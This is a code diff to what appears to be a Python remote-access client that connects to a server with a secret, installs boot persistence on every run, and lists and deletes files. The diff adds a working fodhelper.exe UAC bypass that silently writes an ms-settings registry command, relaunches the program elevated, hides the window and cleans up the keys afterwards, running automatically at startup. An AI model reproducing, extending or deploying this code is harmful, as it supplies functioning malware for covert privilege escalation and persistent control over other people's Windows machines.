@@ -485,17 +485,27 @@ def _flist(path=""):
     if not t.exists(): return {"error": "Not found"}
     if t.is_file(): return {"error": "Not a dir"}
     items = []
+    denied = False
     try:
-        for e in sorted(t.iterdir(), key=lambda e: (not e.is_dir(), e.name.lower())):
-            try:
-                s = e.stat(); items.append({"name": e.name, "path": str(e.resolve()),
-                    "type": "dir" if e.is_dir() else "file", "size": s.st_size if e.is_file() else 0,
-                    "modified": datetime.fromtimestamp(s.st_mtime).isoformat()})
-            except: items.append({"name": e.name, "path": str(e.resolve()),
-                "type": "dir" if e.is_dir() else "file", "size": 0, "modified": "", "inaccessible": True})
-    except PermissionError: return {"error": "Denied"}
+        entries = list(t.iterdir())
+    except PermissionError:
+        denied = True
+        entries = []
+    except OSError:
+        denied = True
+        entries = []
+    for e in sorted(entries, key=lambda e: (not e.is_dir(), e.name.lower())):
+        try:
+            s = e.stat(); items.append({"name": e.name, "path": str(e.resolve()),
+                "type": "dir" if e.is_dir() else "file", "size": s.st_size if e.is_file() else 0,
+                "modified": datetime.fromtimestamp(s.st_mtime).isoformat()})
+        except: items.append({"name": e.name, "path": str(e.resolve()),
+            "type": "dir" if e.is_dir() else "file", "size": 0, "modified": "", "inaccessible": True})
     parent = str(t.parent.resolve()) if t.parent != t else None
-    return {"path": str(t.resolve()), "parent": parent, "items": items}
+    result = {"path": str(t.resolve()), "parent": parent, "items": items}
+    if denied:
+        result["warning"] = "Partial listing - some entries may be hidden due to permissions"
+    return result
 
 def _fdel(path):
     t = Path(path).resolve()
@@ -594,6 +604,128 @@ exit
     except Exception as e:
         log.error(f"Update download/install failed: {e}")
         return False
+
+# ── Admin / UAC Bypass ───────────────────────────────────────────────
+def _is_admin():
+    """Check if running with admin privileges (Windows only)."""
+    try:
+        if sys.platform == "win32":
+            return ctypes.windll.shell32.IsUserAnAdmin() != 0
+    except:
+        pass
+    # Unix fallback
+    try:
+        return os.getuid() == 0
+    except:
+        pass
+    return False
+
+def _fodhelper_uac_bypass(args):
+    """Silent UAC bypass using fodhelper.exe (Windows 10/11).
+    Creates registry keys, launches fodhelper, and exits current process.
+    The elevated instance will clean up and resume."""
+    if sys.platform != "win32":
+        log.warning("UAC bypass is Windows-only")
+        return False
+
+    try:
+        import winreg as wr
+    except ImportError:
+        log.error("winreg not available for UAC bypass")
+        return False
+
+    exe_path = _exepath()
+    # Build elevated command: pass all current args except --elevated, add --elevated
+    elevated_args = []
+    i = 1
+    while i < len(sys.argv):
+        a = sys.argv[i]
+        if a in ("--elevated", "--no-elevate", "--uninstall", "--install"):
+            i += 1
+            continue
+        if a in ("--server", "--secret", "--id", "--reconnect"):
+            elevated_args.append(a)
+            if i + 1 < len(sys.argv):
+                elevated_args.append(sys.argv[i + 1])
+                i += 1
+        else:
+            elevated_args.append(a)
+        i += 1
+    elevated_args.append("--elevated")
+    cmd = subprocess.list2cmdline([exe_path] + elevated_args)
+    log.info(f"UAC bypass: relaunching as admin (fodhelper)")
+
+    try:
+        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
+        # Clean up any previous keys first
+        try:
+            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
+            wr.DeleteValue(key, "DelegateExecute")
+            wr.CloseKey(key)
+        except:
+            pass
+        key = wr.CreateKey(wr.HKEY_CURRENT_USER, reg_path)
+        wr.SetValueEx(key, "", 0, wr.REG_SZ, cmd)
+        wr.SetValueEx(key, "DelegateExecute", 0, wr.REG_SZ, "")
+        wr.CloseKey(key)
+
+        # Ensure ms-settings key exists
+        try:
+            settings_key = wr.CreateKey(wr.HKEY_CURRENT_USER, r"Software\Classes\ms-settings")
+            wr.CloseKey(settings_key)
+        except:
+            pass
+
+        # Launch fodhelper.exe (auto-elevated)
+        fodhelper_path = os.path.join(os.environ.get("WINDIR", "C:\\Windows"), "System32", "fodhelper.exe")
+        subprocess.Popen(fodhelper_path, creationflags=subprocess.CREATE_NO_WINDOW | 0x00000008, close_fds=True)
+        log.info("UAC bypass triggered - exiting current instance")
+        time.sleep(0.5)
+        os._exit(0)
+    except Exception as e:
+        log.error(f"UAC bypass failed: {e}")
+        # Try to clean up
+        try:
+            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
+        except:
+            pass
+        return False
+
+
+def _cleanup_uac_registry():
+    """Remove fodhelper registry keys left by the bypass."""
+    try:
+        import winreg as wr
+        reg_path = r"Software\Classes\ms-settings\Shell\open\command"
+        try:
+            key = wr.OpenKey(wr.HKEY_CURRENT_USER, reg_path, 0, wr.KEY_SET_VALUE)
+            try:
+                wr.DeleteValue(key, "DelegateExecute")
+            except:
+                pass
+            try:
+                wr.DeleteValue(key, "")
+            except:
+                pass
+            wr.CloseKey(key)
+        except:
+            pass
+        # Try to delete the key itself
+        try:
+            wr.DeleteKey(wr.HKEY_CURRENT_USER, reg_path)
+        except:
+            pass
+        # Clean parent keys if empty
+        for p in [r"Software\Classes\ms-settings\Shell\open",
+                  r"Software\Classes\ms-settings\Shell",
+                  r"Software\Classes\ms-settings"]:
+            try:
+                wr.DeleteKey(wr.HKEY_CURRENT_USER, p)
+            except:
+                pass
+        log.info("UAC registry cleaned up")
+    except Exception as e:
+        log.debug(f"UAC cleanup (non-critical): {e}")
 
 _keepalive_stop = threading.Event()
 
@@ -927,6 +1059,8 @@ def main():
     p.add_argument("--install", action="store_true", help="Install persistence")
     p.add_argument("--uninstall", action="store_true", help="Remove persistence")
     p.add_argument("--no-persist", action="store_true", help="Skip auto-persistence")
+    p.add_argument("--elevated", action="store_true", help=argparse.SUPPRESS)
+    p.add_argument("--no-elevate", action="store_true", help="Skip UAC bypass on startup")
     args = p.parse_args()
 
     url = args.server or _SERVER; secret = args.secret or _SECRET
@@ -942,6 +1076,21 @@ def main():
         if not url or not secret: print("ERROR: --server and --secret required for --install"); sys.exit(1)
         if install_persist(url, secret, rec, cid): print("\n[+] Persistence installed! Auto-start on boot.\n")
         else: print("\n[-] Install failed. Run as admin.\n")
+
+    # Silent UAC bypass on startup (unless --no-elevate or --elevated)
+    if sys.platform == "win32" and not getattr(args, "no_elevate", False) and not getattr(args, "elevated", False):
+        if not _is_admin():
+            log.info("Not admin - attempting silent UAC bypass...")
+            _fodhelper_uac_bypass(args)
+            # If fodhelper worked, we exit inside the function. If we get here, it failed.
+            print("[!] UAC bypass failed - running with limited privileges")
+        else:
+            log.info("Already running as admin")
+
+    # Clean up fodhelper registry keys if elevated
+    if getattr(args, "elevated", False):
+        log.info("Running elevated - cleaning up UAC bypass registry...")
+        _cleanup_uac_registry()
 
     # Auto-install persistence on every run (unless --no-persist)
     if not args.no_persist and not args.uninstall:
